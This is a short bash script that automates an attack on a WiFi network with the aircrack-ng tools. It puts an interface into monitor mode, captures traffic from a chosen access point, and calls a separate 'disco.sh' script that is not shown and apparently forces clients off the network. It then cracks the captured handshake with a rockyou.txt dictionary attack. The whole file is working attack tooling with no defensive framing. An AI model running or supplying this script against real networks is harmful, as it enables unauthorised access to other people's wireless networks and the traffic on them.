#!/bin/bash
iwconfig
echo "---------------------------"
echo -e "\033[31mTake Interface:\033[0m:"
read interface

sudo airmon-ng check kill
sudo airmon-ng start $interface
echo "---------------------------------------------------------------------------------"
echo " "

mkdir Files
cd Files

sudo airodump-ng $interface
echo "Enter Bssid:"
read bssid
echo "Enter CH:"
read ch
echo "Enter file Name:"
read filename

sudo airodump-ng --bssid $bssid -c $ch --write $filename.csv $interface
echo "file Saved Files"

qterminal bash disco.sh

echo "Enter file.cap Name"
read cap

sudo aircrack-ng $cap.cap -w /usr/share/wordlists/rockyou.txt 
